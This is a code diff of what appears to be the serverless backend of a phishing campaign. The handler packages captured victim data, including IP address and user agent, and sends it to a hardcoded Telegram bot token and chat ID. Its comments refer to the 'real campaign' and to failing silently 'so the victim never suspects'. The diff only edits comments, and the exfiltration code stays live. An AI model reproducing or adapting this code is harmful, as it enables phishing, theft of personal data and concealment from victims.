@@ -5,8 +5,8 @@ const BOT_TOKEN = '8599934735:AAGgL4MeTqbUM_gzNsAUcLMwxCnbGSOcn-4';   // from @B
 const CHAT_ID   = '8604770803';     // from @userinfobot
 // ===========================================
 
-// DEBUG = true shows error details on the page while you test,
-// so you can SEE what's wrong. Set to false for the real campaign.
+// DEBUG = true shows error details on the page while you test.
+// Set to false for the real campaign.
 const DEBUG = true;
 
 exports.handler = async (event) => {
@@ -63,7 +63,6 @@ exports.handler = async (event) => {
     '──────────────────\n' +
     '🕐 ' + data.ip + ' | ' + data.user_agent;
 
-  // Deliver to Telegram — and actually listen for the reply this time
   try {
     await new Promise((resolve, reject) => {
       const body = JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: 'HTML' });
@@ -92,7 +91,6 @@ exports.handler = async (event) => {
     });
   } catch (err) {
     if (DEBUG) {
-      // You'll see this on screen during testing — fix what it says
       return { statusCode: 500, body: 'Telegram error: ' + err.message };
     }
     // Live mode: fail silently so the victim never suspects
